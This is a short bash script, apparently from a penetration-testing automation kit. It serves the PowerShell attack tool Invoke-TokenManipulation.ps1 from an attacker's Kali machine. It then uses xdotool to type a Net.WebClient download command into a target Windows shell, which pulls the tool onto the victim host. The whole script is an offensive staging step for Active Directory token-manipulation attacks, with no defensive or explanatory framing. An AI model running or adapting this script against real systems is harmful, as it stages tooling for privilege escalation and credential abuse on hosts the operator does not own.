#!/bin/bash

: '
ps: Upload Invoke-TokenManipulation.ps1
'

LOCATION="${SCRIPTS_DIR}/windows/activeDirectroy/invokeTokenManipulation/.files"
FILE="Invoke-TokenManipulation.ps1"

ps_webclient_upload_file "${LOCATION}" "${FILE}"

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/Invoke-TokenManipulation.ps1', '${TMP_FOLDER}\Invoke-TokenManipulation.ps1')"
xdotool key Return
sleep 3

sleep 60
kill $HTTP_PID
